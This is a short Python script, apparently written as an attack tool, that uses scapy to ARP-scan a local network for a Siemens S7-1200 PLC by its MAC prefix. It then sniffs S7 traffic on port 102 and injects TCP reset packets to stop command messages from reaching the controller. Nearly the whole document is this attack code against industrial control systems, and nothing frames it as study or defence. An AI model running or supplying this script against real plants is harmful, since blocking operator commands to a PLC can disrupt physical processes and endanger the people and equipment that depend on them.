from scapy.all import *
import time
import subprocess

# Function to discover the PLC's IP address
def discover_plc_ip():
    # Perform an ARP scan of the local network to find the PLC
    arp = ARP(pdst="192.168.1.0/24")  # Adjust the subnet as needed
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    result = srp(packet, timeout=2, verbose=0)[0]

    # Iterate through the results to find the PLC
    for sent, received in result:
        # Check if the device is a Siemens S7-1200 PLC (based on MAC address prefix)
        if received.hwsrc.startswith("00:1c:06"):  # Siemens MAC prefix
            return received.psrc

    return None

# Function to block command messages to the PLC
def block_command_messages(plc_ip):
    print(f"Blocking command messages to PLC at {plc_ip}...")

    # Define a filter to capture S7 traffic (ISO-TSAP protocol)
    def packet_filter(pkt):
        return IP in pkt and TCP in pkt and pkt[IP].dst == plc_ip and pkt[TCP].dport == 102  # S7 uses port 102

    # Sniff the network and drop packets matching the filter
    def drop_packet(pkt):
        send(IP(dst=pkt[IP].dst)/TCP(dport=pkt[TCP].dport, flags="R"), verbose=0)
        print(f"Blocked command message to {pkt[IP].dst}")

    # Start sniffing and blocking
    sniff(filter=f"tcp and host {plc_ip} and port 102", prn=drop_packet, lfilter=packet_filter)

# Main script
if __name__ == "__main__":
    # Step 1: Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if plc_ip:
        print(f"Discovered PLC at {plc_ip}")
        # Step 2: Block command messages to the PLC
        block_command_messages(plc_ip)
    else:
        print("PLC not found on the network.")